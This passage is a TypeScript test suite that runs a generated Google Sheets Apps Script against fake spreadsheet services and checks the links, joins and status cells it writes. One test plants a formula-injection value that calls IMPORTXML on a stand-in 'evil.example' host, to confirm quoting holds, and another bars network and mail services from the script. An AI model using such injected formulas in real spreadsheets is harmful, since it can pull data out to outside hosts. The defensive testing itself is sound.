/**
 * The review sheet's Apps Script, run outside Google: the built Code.gs is
 * evaluated against a small fake of the Apps Script services it calls, over a
 * three-tab sheet, and the links and joins it writes are checked.
 *
 * Skill: `review-sheet-script`. What this proves is that the template and the
 * builder agree and the script writes what the skill says it writes. It does
 * not prove the sheet is installed or current; the skill's "How to tell it
 * works" covers that.
 */
import { describe, expect, test } from "bun:test";
import { mkdtempSync, writeFileSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { buildConfig, buildScript, chunks, CODE_GS_RAW, CODE_GS_URL, LIBRARY_ID, STUB_GS_URL, configRows, draftingSheetSync, linkLines, readable, repoOfSite, sheetIdOf, tabInstructions, tocRows } from "./build-review-sheet-script.js";
import { readFileSync as readText } from "node:fs";
import { feedbackBasis, hashOf, PC_BASIS_GREY } from "./feedback-issue.js";

const code = buildScript();
/** A fake Apps Script TextStyle builder: every setter chains; build() keeps bold. */
const textStyle = () => {
  const st: { bold?: boolean } = {};
  const c: Record<string, unknown> = new Proxy({}, { get: (_t, k) => (k === "build" ? () => ({ ...st }) : (v: unknown) => { if (k === "setBold") st.bold = !!v; return c; }) });
  return c;
};
const withConfig = <T extends object>(t: T, rows: string[][]) => ({ ...t, Config: { id: 50, rows } });

type Prot = { col: string; from?: number; desc: string; editors: string[]; removed: boolean; api?: { getDescription(): string; remove(): void } };
type Rich = { text: string; links: [number, number, string][]; bold: [number, number][] };

/** A fake folio: a draft with printed pages 1–3 on PDF pages 12–14 (offset 11). */
function folio(tabs?: Record<string, string>): string {
  const repo = mkdtempSync(join(tmpdir(), "review-sheet-"));
  mkdirSync(join(repo, "review/public-comment"), { recursive: true });
  writeFileSync(join(repo, "anchors.json"), JSON.stringify({
    chapters: [{ dir: "ch1", title: "Introduction", number: 1 }],
    sections: [{ label: "sec:1-2", number: "1.2", title: "Scope", page: 13 }],
    blocks: [
      { page: 12, printedPage: "1", sections: ["sec:ch1-lead"] },
      { page: 13, printedPage: "2", sections: ["sec:ch1-lead", "sec:1-2"] },
    ],
  }));
  writeFileSync(join(repo, "lines.json"), JSON.stringify({
    pages: {
      "12": { printed: "1", lines: { "1": "one", "2": "two" } },
      "13": { printed: "2", lines: { "3": "three", "4": "four" } },
      "14": { printed: "3", lines: { "5": "five" } },
    },
  }));
  writeFileSync(join(repo, "review/public-comment/sheet-sync.json"), JSON.stringify({
    anchors: "anchors.json",
    lineMap: "lines.json",
    draftUrl: "https://x.example/D#page=",
    commentUrl: "https://x.example/C#",
    ...(tabs ? { tabs } : {}),
  }));
  return repo;
}

/** A fake of the Apps Script services the script calls, over tabs of strings. */
function runtime(tabs: Record<string, { id: number; rows: string[][] }>) {
  const written: Record<string, Record<string, unknown[][]>> = {};
  const props: Record<string, string> = {};
  const toasts: string[] = [];
  // A write lands at its rows: a whole column is the array of its rows from
  // row 2; a one-row write fills only its place.
  // A legend row ("Instructions", or the older "Colour key") above the header moves the data down.
  const hdr = (name: string) => {
    let h = 0;
    while (h < tabs[name].rows.length - 1 && /^(instructions|colou?r key)/i.test(tabs[name].rows[h][0])) h++;
    return h;
  };
  const put = (name: string, h: string, r: number, v: unknown[][]) => {
    const tab = (written[name] ??= {});
    const top = hdr(name) + 2;
    if (r === 1 || (r === top && v.length > 1)) return void (tab[h] = v);
    const arr = (tab[h] ??= []);
    v.forEach((x, i) => (arr[r - top + i] = x));
  };
  const sheet = (name: string) => {
    const t = tabs[name];
    return {
      hideSheet: () => ((t as { hidden?: boolean }).hidden = true),
      getName: () => name,
      getSheetId: () => t.id,
      getLastRow: () => t.rows.length,
      getLastColumn: () => t.rows[0].length,
      getMaxRows: () => 500,
      getProtections: () => ((t as { prot?: Prot[] }).prot ??= []).filter((p) => !p.removed).map((p) => p.api!),
      getRange: (r: number, c: number, nr: number, nc: number) => ({
        protect: () => {
          const p: Prot = { col: t.rows[hdr(name)][c - 1], from: r, desc: "", editors: ["owner@x.example"], removed: false };
          ((t as { prot?: Prot[] }).prot ??= []).push(p);
          const api = {
            setDescription: (d: string) => ((p.desc = d), api),
            getDescription: () => p.desc,
            getEditors: () => p.editors.slice(),
            removeEditors: (es: string[]) => ((p.editors = p.editors.filter((e) => e === "owner@x.example" || !es.includes(e))), api),
            addEditors: (es: string[]) => ((p.editors = [...new Set([...p.editors, ...es])]), api),
            remove: () => { p.removed = true; },
          };
          p.api = api;
          return api;
        },
        getDisplayValues: () => t.rows.slice(r - 1, r - 1 + nr).map((row) => row.slice(c - 1, c - 1 + nc)),
        setValues: (v: unknown[][]) => put(name, t.rows[r === 1 ? 0 : hdr(name)][c - 1], r, v),
        setRichTextValues: (v: unknown[][]) => put(name, t.rows[r === 1 ? 0 : hdr(name)][c - 1], r, v),
        setRichTextValue: (v: unknown) => put(name, t.rows[r === 1 ? 0 : hdr(name)][c - 1], r, [[v]]),
        clearContent: () => {},
        setBackground(bg: string) { ((t as { bg?: Record<number, string> }).bg ??= {})[r] = bg; return this; },
        setVerticalAlignment() { return this; },
        setFontWeight() { return this; },
      }),
    };
  };
  const builder = () => {
    const r: Rich = { text: "", links: [], bold: [] };
    const b = {
      setText: (s: string) => ((r.text = s), b),
      setLinkUrl: (a: number, z: number, u: string) => (r.links.push([a, z, u]), b),
      setTextStyle: (a: number, z: number, st?: { bold?: boolean }) => (st?.bold && r.bold.push([a, z]), b),
      build: () => r,
    };
    return b;
  };
  const g = {
    SpreadsheetApp: {
      getActive: () => ({
        getId: () => "copy-sheet-id",
        toast: (msg: string) => toasts.push(msg),
        getSheetByName: (n: string) => (tabs[n] ? sheet(n) : null),
        insertSheet: (n: string) => ((tabs[n] = { id: 99, rows: [["Section", "Link"]] }), sheet(n)),
      }),
      newRichTextValue: builder,
      ProtectionType: { RANGE: "RANGE" },
      newTextStyle: textStyle,
    },
    LockService: { getDocumentLock: () => ({ tryLock: () => true, releaseLock: () => {} }) },
    PropertiesService: {
      getDocumentProperties: () => ({
        getProperty: (k: string) => props[k] ?? null,
        setProperty: (k: string, v: string) => (props[k] = v),
        deleteProperty: (k: string) => delete props[k],
      }),
    },
  };
  return { g, written, props, sheet, toasts };
}

const T = (x: unknown) => (x && typeof x === "object" && "text" in (x as object) ? (x as { text: string }).text : x);
function load(code: string, g: Record<string, unknown>) {
  const fn = new Function(...Object.keys(g), `${code}\nreturn { refreshAll, markDirty, refreshIfDirty };`);
  return fn(...Object.values(g)) as { refreshAll(): void; markDirty(e: unknown): void; refreshIfDirty(): void };
}

const tabs = () => ({
  "Review Public Comments": {
    id: 1,
    rows: [
      ["No.", "Sections", "Page", "Line no(s) / Table / Figure", "Comment / issue", "Suggested revision", "Committee Feedback (initials)", "Disposition", "Status", "Agentic status"],
      ["1", "1.2 and Chapter 1", "2", "p.2 line 3", "Too short", "Lengthen it", "AB agrees", "", "Pending", ""],
      ["2", "nowhere", "3", "L 5", "Typo", "", "", "Accepted", "", ""],
      ["3", "", "", "", "Off topic", "", "", "", "", ""],
    ],
  },
  "Agent - Comments": {
    id: 2,
    rows: [
      ["No.", "Comment ref", "Agentic status", "Change-sets"],
      ["1", "PC-0002", "PR open", "CS-001"],
      ["2", "PC-0003", "PR open", "CS-001"],
      ["3", "PC-0004", "Not started", "CS-002"],
    ],
  },
  "Agent - Change Sets": {
    id: 4,
    rows: [
      ["Change-set", "Title", "Pull request (change set)", "What the PRs changed (change set)", "Agent completed (UTC, change set)"],
      ["CS-001", "Fix scope", "https://github.com/o/r/pull/97\nhttps://github.com/o/r/pull/130", "Adds the scope\nFixes a typo", "2026-10-30 22:30Z"],
      ["CS-002", "Other", "", "", ""],
    ],
  },
  "Review Change Sets": {
    id: 3,
    rows: [
      ["Change-set", "Sections", "Pages", "Public Comments", "Suggested Revisions", "PC Committee Feedback", "Dispositions", "Agentic status"],
      ["CS-001", "", "", "", "", "", "", ""],
      ["CS-002", "", "", "", "", "", "", ""],
    ],
  },
});

const pcTabs = tabs;
const slice = (r: Rich, [a, z]: [number, number, ...unknown[]]) => r.text.slice(a, z);

describe("review-sheet.gs, built and run against a fake sheet", () => {
  const pcRows = configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"));
  const rt = runtime(withConfig(tabs(), pcRows));
  load(code, rt.g).refreshAll();
  const rpc = rt.written["Review Public Comments"];
  const rcs = rt.written["Review Change Sets"];

  test("noTemplatePlaceholderLeft", () => {
    expect(code).not.toContain("/*@@CONFIG@@*/");
    expect(code).not.toContain("@@STAMP@@");
    // A sheet can say which build it runs, and where the latest is (owner, 2026-10-31).
    expect(code).toMatch(/const SCRIPT_VERSION = '(\S+|template sha256 [0-9a-f]{16}|[0-9a-f]{40}.*)';/);
    expect(code).toContain("'Which version is this?', 'showVersion'");
    expect(code).toContain("@OnlyCurrentDoc");
    expect(code).toMatch(/at ([0-9a-f]{40}|unknown)/);
    expect(code).not.toMatch(/UrlFetchApp|MailApp|GmailApp|DriveApp/);
  });

  test("rpcNoLinksCommentPage", () => {
    expect(rpc["No."]).toEqual([['=HYPERLINK("https://x.example/C#PC-0002",1)'], ['=HYPERLINK("https://x.example/C#PC-0003",2)'], ['=HYPERLINK("https://x.example/C#PC-0004",3)']]);
  });

  test("rpcSectionsLinkPdfPages", () => {
    const r = rpc.Sections[0][0] as Rich;
    expect(r.links.map((l) => [slice(r, l), l[2]])).toEqual([["1.2", "https://x.example/D#page=13"], ["Chapter 1", "https://x.example/D#page=12"]]);
    expect((rpc.Sections[1][0] as Rich).links).toEqual([]);
  });

  test("rpcPageAtOffset", () => {
    expect((rpc.Page[0][0] as Rich).links).toEqual([[0, 1, "https://x.example/D#page=13"]]);
    expect((rpc.Page[1][0] as Rich).links).toEqual([[0, 1, "https://x.example/D#page=14"]]);
  });

  test("rpcLinesToPage", () => {
    const r = rpc["Line no(s) / Table / Figure"][0][0] as Rich;
    expect(r.links.map((l) => [slice(r, l), l[2]])).toEqual([["p.2", "https://x.example/D#page=13"], ["line 3", "https://x.example/D#page=13"]]);
    const r2 = rpc["Line no(s) / Table / Figure"][1][0] as Rich;
    expect(r2.links.map((l) => [slice(r2, l), l[2]])).toEqual([["L 5", "https://x.example/D#page=14"]]);
  });

  test("rcsJoinsComments", () => {
    const c = rcs["Public Comments"][0][0] as Rich;
    expect(c.text).toBe("No. 1 (Pending) · Too short\nNo. 2 · Typo");
    expect(c.links.map((l) => [slice(c, l), l[2]])).toEqual([["No. 1", "#gid=1&range=A2"], ["No. 2", "#gid=1&range=A3"]]);
    expect(c.bold.map(([a, z]) => c.text.slice(a, z))).toEqual(["(Pending)"]);
    expect((rcs["Suggested Revisions"][0][0] as Rich).text).toBe("No. 1 · Lengthen it");
    expect((rcs["PC Committee Feedback"][0][0] as Rich).text).toBe("No. 1 · AB agrees");
    expect((rcs.Dispositions[0][0] as Rich).text).toBe("No. 2 · Accepted");
  });

  test("rcsSectionsPagesUnion", () => {
    const s = rcs.Sections[0][0] as Rich;
    expect(s.text).toBe("1, 1.2, nowhere");
    expect(s.links.map((l) => l[2])).toEqual(["https://x.example/D#page=12", "https://x.example/D#page=13"]);
    const p = rcs.Pages[0][0] as Rich;
    expect(p.text).toBe("2–3");
    expect(p.links).toEqual([[0, 3, "https://x.example/D#page=13"]]);
  });

  test("agenticStatusBothTabs", () => {
    for (const cell of [rcs["Agentic status"][0][0], rpc["Agentic status"][0][0]] as Rich[]) {
      expect(cell.text).toBe("r#97 (PR open, 2026-10-30 22:30Z) · Adds the scope\nr#130 (PR open) · Fixes a typo");
      expect(cell.links.map((l) => [slice(cell, l), l[2]])).toEqual([
        ["r#97", "https://github.com/o/r/pull/97"],
        ["r#130", "https://github.com/o/r/pull/130"],
      ]);
      expect(cell.bold.map(([a, z]) => cell.text.slice(a, z))).toEqual(["(PR open, 2026-10-30 22:30Z)", "(PR open)"]);
    }
  });

  test("noPrStatusAlone", () => {
    expect((rcs["Agentic status"][1][0] as Rich).text).toBe("Not started");
    expect((rpc["Agentic status"][2][0] as Rich)).toEqual({ text: "Not started", links: [], bold: [] });
  });

  test("quoteCannotBreakFormula", () => {
    const t = tabs();
    t["Review Public Comments"].rows[1][0] = 'x",IMPORTXML("https://evil.example","//a"),"';
    t["Agent - Comments"].rows[1][0] = t["Review Public Comments"].rows[1][0];
    const rt2 = runtime(withConfig(t, pcRows));
    load(code, rt2.g).refreshAll();
    const f = rt2.written["Review Public Comments"]["No."][0][0] as string;
    expect(f).toBe('=HYPERLINK("https://x.example/C#PC-0002","x"",IMPORTXML(""https://evil.example"",""//a""),""")');
  });

  test("oldDataNamesWork", () => {
    const d = JSON.parse(pcRows.filter((r) => r[0] === "DATA").map((r) => r[1].slice(1)).join(""));
    const old = { K: d.SECTIONS, ABBR: d.ABBREVIATIONS, LP: d.PAGE_LINES, OFFSET: d.PAGE_OFFSET, MAX: d.LAST_PAGE };
    const rows = pcRows.filter((r) => r[0] !== "DATA").concat([["DATA", "|" + JSON.stringify(old)]]);
    const a = runtime(withConfig(tabs(), pcRows));
    const b = runtime(withConfig(tabs(), rows));
    load(code, a.g).refreshAll();
    load(code, b.g).refreshAll();
    expect(JSON.stringify(b.written)).toBe(JSON.stringify(a.written));
  });

  test("filterStatusPlain", () => {
    const t = tabs();
    t["Review Change Sets"].rows[0].push("Agentic status (filter)");
    t["Review Change Sets"].rows.slice(1).forEach((r) => r.push(""));
    t["Agent - Comments"].rows[2][2] = "Needs human";
    const rt2 = runtime(withConfig(t, pcRows));
    load(code, rt2.g).refreshAll();
    expect(rt2.written["Review Change Sets"]["Agentic status (filter)"]).toEqual([["Needs you: answer the agent's question"], ["Not started"]]);
  });

  test("colourKeyRowNoChange", () => {
    const keyed = withConfig(tabs(), pcRows) as Record<string, { id: number; rows: string[][] }>;
    for (const n of ["Review Public Comments", "Review Change Sets"]) {
      const r = keyed[n].rows;
      r.unshift(["Colour key: Grey = mechanical", ...r[0].slice(1).map(() => "")]);
    }
    const b = runtime(keyed);
    load(code, b.g).refreshAll();
    expect(b.written["Review Public Comments"]).toEqual(rpc);
    const rcsB = b.written["Review Change Sets"], rcsA = rt.written["Review Change Sets"];
    // Links from RCS to an RPC row point one row lower.
    expect(JSON.stringify(rcsB)).toBe(JSON.stringify(rcsA).replace(/range=A(\d+)/g, (_, n) => "range=A" + (+n + 1)));
  });

  test("architectFeedbackHeaderWorks", () => {
    const old = withConfig(tabs(), pcRows) as Record<string, { id: number; rows: string[][] }>;
    for (const n of ["Review Public Comments", "Review Change Sets"])
      old[n].rows[0] = old[n].rows[0].map((h) => h.replace("Committee Feedback", "Architect Feedback"));
    const b = runtime(old);
    load(code, b.g).refreshAll();
    expect((b.written["Review Change Sets"]["PC Architect Feedback"][0][0] as Rich).text).toBe("No. 1 · AB agrees");
  });

  test("renameMarksNothingStale", () => {
    const oldHdr = ["Change-set", "Title", "TWG (CS)", "Architect Feedback (CL)", "Architect Feedback (agent)", "Ready for agent"];
    const row = ["CS-001", "Fix scope", "TWG 1", "do it", "Proposal", "Yes"];
    const basis = feedbackBasis(oldHdr, row, ["Title", "TWG (CS)"], "Architect Feedback");
    const t = withConfig(tabs(), pcRows) as Record<string, { id: number; rows: string[][] }>;
    t["Review Change Sets"].rows = [oldHdr.map((h) => h.replace("Architect", "Committee")), row];
    t["Agent - Change Sets"].rows[0].push("Feedback basis (change set)");
    t["Agent - Change Sets"].rows[1].push(basis);
    const run = () => { const b = runtime(t); load(code, b.g).refreshAll(); return b.written["Review Change Sets"] ?? {}; };
    // Only the status is added (this sheet has no Agentic status column, so
    // the status block sits on top); the proposal is not flagged.
    expect(T(run()["Committee Feedback (agent)"]?.[0]?.[0])).toBe("\u23f3 r#130 open; no preview yet.\n\u21b3 r#97 (PR open, 2026-10-30 22:30Z) \u00b7 Adds the scope\n\u21b3 r#130 (PR open) \u00b7 Fixes a typo\nProposal");
    expect(run()["Ready for agent"]).toBeUndefined();
    // Control: a real change is still caught under the new name.
    row[3] = "do it differently";
    const w = run();
    expect(String(T(w["Committee Feedback (agent)"][0][0]))).toMatch(/^\u26a0 Stale: /);
    expect(w["Ready for agent"][0][0]).toBe("No");
  });

  test("slowSheetFlagsStaleAtOnce", () => {
    const hdr = ["Change-set", "Title", "TWG (CS)", "Committee Feedback (CL)", "Change Set Feedback (agent)", "Ready for agent"];
    const row = ["CS-001", "Fix scope", "TWG 1", "do it", "Proposal", "Yes"];
    const basis = feedbackBasis(hdr, row, ["Title", "TWG (CS)"], "Committee Feedback");
    const t = withConfig(tabs(), pcRows) as Record<string, { id: number; rows: string[][] }>;
    t["Review Change Sets"].rows = [hdr, row];
    t["Agent - Change Sets"].rows[0].push("Feedback basis (change set)");
    t["Agent - Change Sets"].rows[1].push(basis);
    row[3] = "do it differently";
    const rt2 = runtime(t);
    rt2.props.lastMs = "20000";
    load(code, rt2.g).markDirty({ range: { getSheet: () => rt2.sheet("Review Change Sets") } });
    expect(rt2.props.dirty).toBe("1");
    expect(String(T(rt2.written["Review Change Sets"]["Change Set Feedback (agent)"][0][0]))).toMatch(/^\u26a0 Stale: /);
  });

  test("readyShownAtOnce", () => {
    const hdr = ["Change-set", "Title", "TWG (CS)", "Committee Feedback (CL)", "Change Set Feedback (agent)", "Ready for agent"];
    const row = ["CS-001", "Fix scope", "TWG 1", "do it", "Proposal", "Yes"];
    const t = withConfig(tabs(), pcRows) as Record<string, { id: number; rows: string[][] }>;
    t["Review Change Sets"].rows = [hdr, row];
    t["Agent - Change Sets"].rows[0].push("Feedback basis (change set)");
    t["Agent - Change Sets"].rows[1].push(feedbackBasis(hdr, row, ["Title", "TWG (CS)"], "Committee Feedback"));
    const rt2 = runtime(t);
    rt2.props.lastMs = "20000";
    const sheet = rt2.sheet("Review Change Sets");
    const edit = (c: number) => ({ range: { getSheet: () => sheet, getColumn: () => c, getNumColumns: () => 1, getRow: () => 2, getNumRows: () => 1 } });
    load(code, rt2.g).markDirty(edit(6));
    expect(rt2.props["ready:CS-001"]).toMatch(/^\d{4}-\d\d-\d\d \d\d:\d\dZ$/);
    expect(String(T(rt2.written["Review Change Sets"]["Change Set Feedback (agent)"][0][0]))).toMatch(/^\u23f3 Ready for agent set .*: the agent will act on this and rewrite it\.\nProposal$/);
    // An edit of another column records nothing.
    const rt3 = runtime(t);
    rt3.props.lastMs = "20000";
    load(code, rt3.g).markDirty({ range: { ...edit(4).range, getSheet: () => rt3.sheet("Review Change Sets") } });
    expect(rt3.props["ready:CS-001"]).toBeUndefined();
  });

  test("oneAgentTabWorks", () => {
    const oneRows = configRows(buildConfig(folio({ AGENT: "Agent", AGENT_CS: "" }), "review/public-comment/sheet-sync.json"));
    const t = withConfig(tabs(), oneRows) as Record<string, { id: number; rows: string[][] }>;
    const c = t["Agent - Comments"].rows, cs = t["Agent - Change Sets"].rows;
    t.Agent = { id: 2, rows: c.map((r, i) => [...r, ...(cs[i] ?? cs[0].map(() => ""))]) };
    delete t["Agent - Comments"];
    delete t["Agent - Change Sets"];
    const b = runtime(t);
    load(code, b.g).refreshAll();
    expect(b.written["Review Change Sets"]).toEqual(rcs);
    expect(b.written["Review Public Comments"]).toEqual(rpc);
  });

  test("quickRebuildAtOnce", () => {
    const rt2 = runtime(withConfig(tabs(), pcRows));
    load(code, rt2.g).markDirty({ range: { getSheet: () => rt2.sheet("Agent - Comments") } });
    expect(rt2.props.dirty).toBeUndefined();
    expect(rt2.written["Review Change Sets"]).toBeDefined();
  });

  test("slowRebuildMarksDirty", () => {
    const rt2 = runtime(withConfig(tabs(), pcRows));
    rt2.props.lastMs = "20000";
    const s = load(code, rt2.g);
    s.markDirty({ range: { getSheet: () => rt2.sheet("Public Comment Source") } });
    expect(rt2.props.dirty).toBeUndefined();
    s.markDirty({ range: { getSheet: () => rt2.sheet("Agent - Comments") } });
    expect(rt2.props.dirty).toBe("1");
    s.refreshIfDirty();
    expect(rt2.props.dirty).toBeUndefined();
    expect(rt2.written["Review Change Sets"]).toBeDefined();
  });

  test("timerRebuildsOnAgentChange", () => {
    const t = withConfig(tabs(), pcRows) as Record<string, { id: number; rows: string[][] }>;
    const rt2 = runtime(t);
    const s = load(code, rt2.g);
    s.refreshIfDirty();
    expect(rt2.written["Review Change Sets"]).toBeDefined();
    delete rt2.written["Review Change Sets"];
    s.refreshIfDirty();
    expect(rt2.written["Review Change Sets"]).toBeUndefined();
    t["Agent - Comments"].rows[3][2] = "PR open";
    s.refreshIfDirty();
    expect(rt2.written["Review Change Sets"]).toBeDefined();
  });
});

/** A fake drafting folio: two chapters, one numbered section, one with a comma. */
function draftFolio(): string {
  const repo = mkdtempSync(join(tmpdir(), "review-sheet-draft-"));
  mkdirSync(join(repo, "review/drafting"), { recursive: true });
  writeFileSync(join(repo, "anchors.json"), JSON.stringify({
    chapters: [
      { dir: "about", title: "About this draft" },
      { dir: "ch01-why", title: "Chapter 1. Why it matters", number: 1 },
      { dir: "ch12-privacy", title: "Chapter 12. Privacy, Security and Trust", number: 12 },
    ],
    sections: [
      { label: "sec:about-lead", title: "About this draft", chapter: "about" },
      { label: "sec:about-questions", title: "Questions for the TWG", chapter: "about" },
      { label: "sec:ch01-lead", title: "Objectives and key messages", chapter: "ch01-why" },
      { label: "sec:1-1", number: "1.1", title: "1.1 Global challenges", chapter: "ch01-why" },
    ],
    blocks: [],
  }));
  writeFileSync(join(repo, "review/drafting/sheet-sync.json"), JSON.stringify({
    mode: "drafting",
    anchors: "anchors.json",
    sectionUrl: "https://x.example/S#",
  }));
  return repo;
}

const draftTabs = () => ({
  "Contributor Feedback": {
    id: 1,
    rows: [
      ["Change-set", "Title", "Selected Sections", "Section links", "Contributor Feedback (CL)", "Contributor Feedback (initials/name)", "Issue", "Agentic status", "Staging review"],
      ["CS-004", "Define registry", "Ch 1 Why it matters,\u2800\u2800\u28001.1 Global challenges", "", "AB: needs a definition", "", "", "", ""],
      ["", "Privacy wording", "Ch 12 Privacy; Security and Trust, Somewhere else, 1.1 Global challenges", "", "", "CD: tighten", "", "", ""],
      ["", "", "", "", "", "", "", "", ""],
    ],
  },
  Agent: {
    id: 2,
    rows: [
      ["Change-set", "Issue", "Agentic status", "Pull request (change set)", "What the PRs changed (change set)", "Agent completed (UTC, change set)", "Staging review page (change set)"],
      ["CS-004", "https://github.com/o/dth/issues/12", "PR open", "https://github.com/o/dth/pull/40", "Adds the definition", "2026-10-30 23:40Z", "https://o.github.io/dth/STAGING/cs-004/en/review/"],
    ],
  },
});

describe("review-sheet.gs in drafting mode", () => {
  const dRows = configRows(buildConfig(draftFolio(), "review/drafting/sheet-sync.json"));
  const tabs = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][]; hidden?: boolean }>;
  const rt = runtime(tabs);
  load(code, rt.g).refreshAll();
  const fb = rt.written["Contributor Feedback"];

  test("draftingNoTabsMessage", () => {
    const rt2 = runtime(withConfig({ "Review Public Comments": { id: 1, rows: [["No."]] } }, dRows) as never);
    expect(() => load(code, rt2.g).refreshAll()).toThrow(/written from review\/drafting\/sheet-sync.json for a drafting sheet.*no "Contributor Feedback"/);
  });

  test("draftingNoConfigMessage", () => {
    const rt2 = runtime(draftTabs() as never);
    expect(() => load(code, rt2.g).refreshAll()).toThrow(/no "Config" tab/);
  });

  test("tabInstructionsShortRows", () => {
    expect(dRows.slice(0, 5).map((r) => r[0])).toEqual(["Instructions", "Instructions - Install script", "Instructions - Dropdown", "Instructions - Editors", "Key"]);
    expect(dRows[0][1]).toContain("EDITORS (owner only)");
    // Installing Code.gs, step by step, with the project named after the sheet (owner, 2026-10-31).
    expect(dRows[1][1]).toMatch(/Extensions, then Apps Script[\s\S]*Name the project after this sheet[\s\S]*Libraries[\s\S]*HEAD[\s\S]*Review[\s\S]*Advanced/);
    expect(dRows[1][1]).toContain("Google hasn't verified this app. The app is requesting access to sensitive info in your Google Account.");
    expect(dRows[1][1]).toContain("https://support.google.com/cloud/answer/7454865");
    expect(dRows[2][1]).toContain("Allow multiple selections");
    expect(dRows[3][1]).toContain("EDITORS");
    expect(dRows[3][1]).toMatch(/Format: plain emails[\s\S]*Example[\s\S]*ana@example\.org\n\s+ben@example\.org/);
    // No Config row is taller than a window.
    expect(Math.max(...dRows.slice(0, 4).map((r) => r[1].split("\n").length))).toBeLessThanOrEqual(10);
    // A public-comment sheet has no dropdown row.
    expect(configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json")).map((r) => r[0])).not.toContain("Instructions - Dropdown");
    const d = tabInstructions(buildConfig(draftFolio(), "review/drafting/sheet-sync.json"));
    const cf = d["Contributor Feedback"];
    expect(cf).toContain("Column colours:     the Authoring Committee     the agent");
    expect(cf).toContain("resets Ready for agent to No");
    expect(cf).toContain("New Contributor Feedback marks the proposal stale");
    expect(cf).toContain("Filter views");
    // No colour is named: the script colours the column names (owner, 2026-11-01).
    for (const t of [...Object.values(d), ...Object.values(tabInstructions(buildConfig(folio(), "review/public-comment/sheet-sync.json")))]) {
      expect(t).not.toMatch(/\b(blue|green|orange|grey)\b/i);
    }
    expect(cf).toContain("/en/cat-harness/processes/contributor-feedback.html");
    const p = tabInstructions(buildConfig(folio(), "review/public-comment/sheet-sync.json"));
    expect(p["Review Public Comments"]).toContain("One row per public comment");
    expect(p["Review Change Sets"]).toContain("One row per change set");
    expect(p["Review Change Sets"]).toContain("/en/cat-harness/processes/public-comment.html");
    expect(Object.values(p).join("\n")).not.toMatch(/architect/i);
    expect(configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"))[1][1]).not.toContain("Allow multiple selections");
  });

  test("scriptSameForEveryDocument", () => {
    expect(code).not.toContain("https://x.example/S#");
    expect(code).not.toContain("Global challenges");
    expect(dRows.find((r) => !(/^Instructions/.test(r[0]) || ["Key", "EDITORS"].includes(r[0])))?.[0]).toBe("CFG");
    expect(dRows.filter((r) => ["GUIDE", "SETUP"].includes(r[0]))).toHaveLength(0);
    expect(dRows.find((r) => r[0] === "EDITORS")![1]).toBe("");
    expect(dRows.every((r) => /^Instructions|^Key$/.test(r[0]) || r[0] === "EDITORS" || r[1].startsWith("|"))).toBe(true);
    expect(JSON.parse(dRows.find((r) => r[0] === "CFG")![1].slice(1)).MODE).toBe("drafting");
  });

  test("scriptPlainAscii", () => {
    expect(/[^\x00-\x7f]/.test(code)).toBe(false);
  });

  test("tocChaptersSections", () => {
    const toc = rt.written.TOC.Section as string[][];
    expect(toc.map((r) => r[0])).toEqual([
      "Section", "About this draft", "About this draft · Questions for the TWG", "Ch 1 Why it matters",
      "Ch 1 · Objectives and key messages", "1.1 Global challenges", "Ch 12 Privacy; Security and Trust",
    ].map((n) => (/^(Section|About this draft$|Ch \d+ [^·])/.test(n) ? n : `\u2800\u2800\u2800${n}`)));
    expect(toc[4][1]).toBe('=HYPERLINK("https://x.example/S#sec:ch01-lead","open")');
    expect(tabs.TOC.hidden).toBe(true);
  });

  test("nextIdForUsedRow", () => {
    expect(fb["Change-set"]).toEqual([["CS-004"], ["CS-005"], [""]]);
  });

  test("sectionLinksPerPick", () => {
    const r = fb["Section links"][0][0] as Rich;
    expect(r.text).toBe("Ch 1 Why it matters\n1.1 Global challenges");
    expect(r.links.map((l) => [slice(r, l), l[2]])).toEqual([["Ch 1 Why it matters", "https://x.example/S#chap:ch01-why"], ["1.1 Global challenges", "https://x.example/S#sec:1-1"]]);
    const r2 = fb["Section links"][1][0] as Rich;
    // A marked pick ("\u2514 1.1 ...") and a bare one (an old value, or a first chip Sheets trimmed) both link.
    expect(r2.links.map((l) => [slice(r2, l), l[2]])).toEqual([["Ch 12 Privacy; Security and Trust", "https://x.example/S#chap:ch12-privacy"], ["1.1 Global challenges", "https://x.example/S#sec:1-1"]]);
    expect(fb.Sections).toBeUndefined();
  });

  test("selectedSectionsKeptValid", () => {
    expect(fb["Selected Sections"][1][0]).toBe("Ch 12 Privacy; Security and Trust, Somewhere else, \u2800\u2800\u28001.1 Global challenges");
    expect((fb["Section links"][1][0] as Rich).text).toBe(
      'Ch 12 Privacy; Security and Trust\n1.1 Global challenges\n\u26a0 "Somewhere else" is not in the document now: pick its section again');
    expect(tabs.TOC.rows.length).toBeGreaterThan(0);
    expect((rt.written.TOC.Section as string[][])[5]).toEqual(["\u2800\u2800\u28001.1 Global challenges", '=HYPERLINK("https://x.example/S#sec:1-1","open")', "sec:1-1"]);
  });

  test("agentTocRowsMatchScript", () => {
    const toc = tocRows(buildConfig(draftFolio(), "review/drafting/sheet-sync.json"))!;
    expect(toc).toEqual(rt.written.TOC.Section as string[][]);
    expect(tocRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"))).toBeUndefined();
  });

  test("oldMarkRewritten", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    t["Contributor Feedback"].rows[1][2] = "\u2514\u20021.1 Global challenges";
    const rt2 = runtime(t);
    load(code, rt2.g).refreshAll();
    expect(rt2.written["Contributor Feedback"]["Selected Sections"][0][0]).toBe("\u2800\u2800\u28001.1 Global challenges");
  });

  test("renamedPickFollowsAnchor", () => {
    const t = withConfig(draftTabs(), dRows) as Record<string, { id: number; rows: string[][] }>;
    t.TOC = { id: 9, rows: [["Section", "Link", "Anchor"], ["\u2800\u2800\u28001.1 Old challenges", "open", "sec:1-1"]] };
    t["Contributor Feedback"].rows[1][2] = "\u2800\u2800\u28001.1 Old challenges";
    const rt2 = runtime(t);
    load(code, rt2.g).refreshAll();
    const f = rt2.written["Contributor Feedback"];
    expect(f["Selected Sections"][0][0]).toBe("\u2800\u2800\u28001.1 Global challenges");
    expect((f["Section links"][0][0] as Rich).text).toBe("1.1 Global challenges");
  });

  test("editorsLockReady", () => {
    const rows = dRows.map((r) => (r[0] === "EDITORS" ? ["EDITORS", "a@x.example\nb@x.example, not-an-email"] : r));
